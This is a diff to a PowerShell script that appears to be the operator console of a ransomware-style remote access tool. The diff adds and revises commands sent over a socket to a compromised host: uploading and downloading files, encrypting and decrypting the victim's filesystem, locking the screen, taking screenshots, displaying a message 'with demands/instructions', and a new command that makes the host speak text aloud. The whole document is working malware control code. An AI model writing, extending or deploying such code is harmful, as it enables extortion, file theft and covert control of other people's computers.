@@ -24,12 +24,18 @@ function PSHandler($port)
 
             while($true)
             {
-                $key_file              = ''
                 $transmitter           = New-Object System.IO.StreamWriter($stream)
                 $receiver              = New-Object System.IO.StreamReader($stream)
                 $plaintext_cmd         = Read-Host "[*]>>>"
                 $cmd                   = [System.Text.Encoding]::Unicode.GetBytes($plaintext_cmd)
                 $cmd                   = [Convert]::ToBase64String($cmd)
+
+                if($plaintext_cmd -eq '')
+                {
+                    $plaintext_cmd     = Read-Host "[*]>>>"
+                    $cmd               = [System.Text.Encoding]::Unicode.GetBytes($plaintext_cmd)
+                    $cmd               = [Convert]::ToBase64String($cmd)
+                }
 
                 if($cmd)
                 {
@@ -45,24 +51,24 @@ function PSHandler($port)
                         }
                         if($plaintext_cmd | Select-String 'send')
                         {
-                        $transmission = '' 
-                        $command     = $plaintext_cmd.Split(' ')[0] 
-                        $filename    = $plaintext_cmd.Split(' ')[1] 
-                        $filename    = Split-Path $filename -Leaf
-                        $filecontent = Get-Content $filename -Encoding Byte
-                        $filecontent = [System.Convert]::ToBase64String($filecontent)
-                        $transmission = "$command#$filename#$filecontent"
-                        $transmitter.WriteLine($transmission)
-                        $transmitter.Flush()
-                        $plaintext_cmd         = Read-Host "[*]>>>"
-                        $cmd                   = [System.Text.Encoding]::Unicode.GetBytes($plaintext_cmd)
-                        $cmd                   = [Convert]::ToBase64String($cmd)
+                            $transmission = '' 
+                            $command     = $plaintext_cmd.Split(' ')[0] 
+                            $filename    = $plaintext_cmd.Split(' ')[1] 
+                            $filename    = Split-Path $filename -Leaf
+                            $filecontent = Get-Content $filename -Encoding Byte
+                            $filecontent = [System.Convert]::ToBase64String($filecontent)
+                            $transmission = "$command#$filename#$filecontent"
+                            $transmitter.WriteLine($transmission)
+                            $transmitter.Flush()
+                            $plaintext_cmd         = Read-Host "[*]>>>"
+                            $cmd                   = [System.Text.Encoding]::Unicode.GetBytes($plaintext_cmd)
+                            $cmd                   = [Convert]::ToBase64String($cmd)
                         }
                         if($plaintext_cmd | Select-String 'download')
                         {
                             $command  = $plaintext_cmd.Split(' ')[0]
                             $filename = $plaintext_cmd.Split(' ')[1]
-                            $transmission = "$command $filename" ; 
+                            $transmission = "$command $filename"  
                             $transmitter.WriteLine($transmission)
                             $transmitter.Flush()
                             Write-Host "[~] Awaiting download..."
@@ -120,20 +126,37 @@ function PSHandler($port)
                             $cmd           = [System.Text.Encoding]::Unicode.GetBytes($plaintext_cmd)
                             $cmd           = [Convert]::ToBase64String($cmd) 
                         }
-                        if($plaintext_cmd -eq 'persist')
+                        if($plaintext_cmd | Select-String 'speak')
                         {
-                            # $transmitter.WriteLine('persist')
-                            # $transmitter.Flush()
-                            # Write-Host "[*] Setting persistence on host"
-                            # $plaintext_cmd = Read-Host "[*]>>>"
-                            # $cmd           = [System.Text.Encoding]::Unicode.GetBytes($plaintext_cmd)
-                            # $cmd           = [Convert]::ToBase64String($cmd) 
+                            $command      = $plaintext_cmd.Split(' ')[0]
+                            $segments     = $plaintext_cmd.Split(' ') 
+                            $transmission = $command
+                            $transmission += "#"
+                            $text         = '' 
+                            for($i = 1; $i -lt $segments.Length; $i++)
+                            {
+                                $text += $segments[$i]
+                                $text += '#'
+                            }
+                            $text = [System.Text.Encoding]::Unicode.GetBytes($text)
+                            $text = [Convert]::ToBase64String($text)
+                            $transmission += $text
+                            $transmitter.WriteLine($transmission)
+                            $transmitter.Flush()
+                            Write-Host "[*] Transmitted text to remote host for artifical vocalization "
+                            $plaintext_cmd = Read-Host "[*]>>>"
+                            $cmd           = [System.Text.Encoding]::Unicode.GetBytes($plaintext_cmd)
+                            $cmd           = [Convert]::ToBase64String($cmd)
                         }
                         if($plaintext_cmd -eq 'lockscreen')
                         {
                             $transmitter.WriteLine('lockscreen')
                             $transmitter.Flush()
                             Write-Host "[*] Sent lock screen command"
+                            $confirmation = $receiver.ReadLine()
+                            $confirmation = [System.Text.Encoding]::Unicode.GetBytes($confirmation)
+                            $confirmation = [System.Convert]::FromBase64String($confirmation)
+                            Write-Host $confirmation
                             $plaintext_cmd = Read-Host "[*]>>>"
                             $cmd           = [System.Text.Encoding]::Unicode.GetBytes($plaintext_cmd)
                             $cmd           = [Convert]::ToBase64String($cmd) 
@@ -143,6 +166,10 @@ function PSHandler($port)
                             $transmitter.WriteLine('staticmessage')
                             $transmitter.Flush()
                             Write-Host "[*] Instructed the host to display the message with demands/instructions"
+                            $confirmation = $receiver.ReadLine()
+                            $confirmation = [System.Text.Encoding]::Unicode.GetBytes($confirmation)
+                            $confirmation = [System.Convert]::FromBase64String($confirmation)
+                            Write-Host $confirmation
                             $plaintext_cmd = Read-Host "[*]>>>"
                             $cmd           = [System.Text.Encoding]::Unicode.GetBytes($plaintext_cmd)
                             $cmd           = [Convert]::ToBase64String($cmd) 
@@ -167,12 +194,12 @@ function PSHandler($port)
                             ------------------------------------
                             1)  Transfer to host   - Syntax: 'send <filename>'     
                             2)  Download from host - Syntax: 'download <filename>'
-                            3)  Encrypt Filesystem - Syntax: 'encryptfs'
-                            4)  Decrypt Filesystem - Syntax: 'decryptfs'
-                            5)  Lock Screen        - Syntax: 'lockscreen'
-                            6)  Take Screenshot    - Syntax: 'screenshot'
-                            7)  Set Persistence    - Syntax: 'persist'
-                            8)  Display Message    - Syntax: 'staticmessage'
+                            3)  Encrypt filesystem - Syntax: 'encryptfs'
+                            4)  Decrypt filesystem - Syntax: 'decryptfs'
+                            5)  Lock screen        - Syntax: 'lockscreen'
+                            6)  Take screenshot    - Syntax: 'screenshot'
+                            7)  Speak via the host - Syntax: 'speak <phrase>'
+                            8)  Display message    - Syntax: 'staticmessage'
                             9)  Invoke help        - Syntax: 'help'
                             10) Exit               - Syntax: 'exit' 
                             "
